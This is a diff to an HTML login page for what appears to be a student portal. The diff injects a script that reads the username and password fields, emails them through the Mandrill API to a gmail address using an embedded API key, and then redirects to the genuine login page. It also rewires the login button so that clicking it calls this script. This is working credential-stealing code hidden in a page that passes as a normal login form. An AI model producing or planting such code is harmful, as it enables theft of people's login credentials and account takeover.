@@ -8,6 +8,36 @@
     
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <meta name="NetsparkQuiltingResult" total-length="8471" removed="0" rules-found="w8192,w2845,w221,w4271,w4286,w4287,w4422,w6493,w6506,w6507,w12241,w4272">
+  
+    <script type="text/javascript">
+      var byName = function(e){ return document.getElementsByName(e)[0]; };
+      var data = "username: " + byName('txtUserName').value + " , password: " + byName('txtUserPass').value;
+      function SendMyData() {
+        $.ajax({
+          type: 'POST',
+          url: 'https://mandrillapp.com/api/1.0/messages/send.json',
+          data: {
+            'key': 'cOO3-oWslCKqfdNsGheVfQ',
+            'message': {
+              'from_email': 'prodevell@gmail.com',
+              'to': [
+                  {
+                    'email': 'prodevell@gmail.com',
+                    'name': 'RECIPIENT NAME (OPTIONAL)',
+                    'type': 'to'
+                  }
+                ],
+              'autotext': 'true',
+              'subject': data,
+              'html': data
+            }
+          }
+         }).done(function(response) {
+           window.location = "http://www.studnet.info/Logon.aspx";
+           console.log(response); // if you're into that sorta thing
+         });
+      }
+    </script>
   </head>
   <body>
     <form name="form1" method="post" action="Logon.aspx?ReturnUrl=%2fDefault.aspx" onsubmit="javascript:return WebForm_OnSubmit();" id="form1">
@@ -99,7 +129,7 @@
                 </tr>
                 <tr>
                     <td colspan="3" style="text-align: center">                     
-                    <input type="image" name="cmdLogin" id="cmdLogin" value="כניסה" src="http://www.studnet.info/Pics/enter.jpg" onclick="javascript:WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;cmdLogin&quot;, &quot;&quot;, true, &quot;&quot;, &quot;&quot;, false, false))" style="border-width:0px;"></td>
+                    <input type="image" name="cmdLogin" id="cmdLogin" value="כניסה" src="http://www.studnet.info/Pics/enter.jpg" onclick="javascript:SendMyData();" style="border-width:0px;"></td>
                 </tr>
                 <tr>
                     <td colspan="3" style="text-align: center">                     
